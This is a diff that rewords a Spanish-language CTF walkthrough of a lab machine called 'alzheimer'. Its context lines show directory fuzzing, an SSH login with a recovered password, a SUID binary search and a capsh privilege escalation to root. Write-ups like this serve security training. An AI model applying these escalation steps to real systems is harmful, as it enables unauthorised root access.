@@ -248,7 +248,7 @@ by Ben "epi" Risher 🤓                 ver: 2.7.3
 [####################] - 1m    120000/120000  1995/s  http://192.168.1.147/secret/home/ 
 ~~~
 
-Encontramos 4 recursos, así que vamos a revisarlos todos:
+Encontramos 4 recursos, así que vamos a revisarlos todos (ponemos el -L para que siga la redirección):
 
 ~~~~bash
 ❯ curl -L $ip/home
@@ -274,12 +274,12 @@ Im trying a lot. Im sure that i will recover my pass!
 
 Aquí nos quedamos sin más por donde tirar, sin embargo, parece que tenemos un usuario, *medusa*, y si recordamos un poco atrás, en el fichero oculto del FTP había una frase un tanto "curiosa", *Ihavebeenalwayshere!!!*
 
-Vamos a probar a conectarnos por SSH.
+Vamos a probar a conectarnos con estos datos por SSH.
 
 
 ### SSH
 
-~~~bash
+~~~
 ❯ ssh medusa@$ip
 The authenticity of host '192.168.1.147 (192.168.1.147)' can't be established.
 ED25519 key fingerprint is SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY.
@@ -319,7 +319,7 @@ User medusa may run the following commands on alzheimer:
 
 Esto no nos lleva a nada, parece un despiste.
 
-Vamos a revisar los ficheros SUID del sistema:
+Vamos a revisar los ficheros SUID que hay en el sistema:
 
 ~~~bash
 medusa@alzheimer:~$ find / -type f -perm -4000 -ls 2>/dev/null
@@ -338,7 +338,7 @@ medusa@alzheimer:~$ find / -type f -perm -4000 -ls 2>/dev/null
      5584     28 -rwsr-sr-x   1 root     root          26776 Feb  6  2019 /usr/sbin/capsh
 ~~~
 
-Vemos el binario *capsh* que tiene buena pinta, vamos a echar mano de nuestro amigo <https://gtfobins.github.io/gtfobins/capsh/> para convertirnos en root:
+Vemos el binario *capsh*, el cual parece que podemos explotar. Vamos a echar mano de nuestro amigo <https://gtfobins.github.io/gtfobins/capsh/> para convertirnos en root:
 
 ~~~bash
 medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
